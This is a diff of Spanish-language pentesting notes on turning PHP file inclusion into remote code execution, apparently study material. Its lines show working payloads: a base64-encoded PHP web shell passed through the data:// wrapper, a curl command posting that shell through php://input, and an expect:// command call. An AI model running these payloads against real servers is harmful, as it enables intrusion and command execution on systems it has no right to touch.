@@ -35,14 +35,16 @@ esto podemos bypassearlo agregando algunos chars como 00%:
 
 podemos lograr rce utilizando el filtro "data" si el parametro allow_url_include se encuentra habilitado:
 
+##### idea:
                 data://text/plain;base64,"web shell en base64"&"parametro de la shell"="comando"
 
+##### aplicación:
 
                 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd="comando"
 
 para métodos POST podemos utilizar el filtro "input":
 
-ejemplo en curl:
+##### ejemplo en curl:
 
 
                 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
@@ -50,7 +52,7 @@ ejemplo en curl:
 En algunos casos los servidores pueden tener instalado el filtro expect que permite en sí mismo correr comandos:
 
 
-ejemplo en curl:
+##### ejemplo en curl:
                 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 
 
